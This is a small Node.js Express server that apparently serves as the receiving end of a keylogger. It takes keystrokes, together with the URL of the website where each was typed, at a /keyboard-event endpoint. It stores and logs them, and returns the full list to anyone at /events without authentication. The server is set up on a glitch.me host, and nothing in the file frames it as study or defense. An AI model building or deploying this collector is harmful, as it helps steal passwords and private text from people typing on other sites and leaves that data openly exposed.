const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;
const path = require("path"); // This imports the path module


// Array to store keyboard events
let events = [];

app.use(express.json());

// Serve the static index.html file
app.use(express.static(__dirname));


// Endpoint to receive keyboard events
app.post("/keyboard-event", (req, res) => {
  const { key, url } = req.body;
  const event = { key, url, timestamp: new Date().toISOString() };
  events.push(event); // Store the event
  console.log(`Received key: ${key} from website: ${url}`);
  res.sendStatus(200);
});

// API endpoint to fetch keyboard events
app.get("/events", (req, res) => {
  res.json(events);
});
// Serve the `index.html` file explicitly for the `/keyboard-event` route
app.get("/keyboard-event", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on https://melon-military-warbler.glitch.me/keyboard-event`);
});
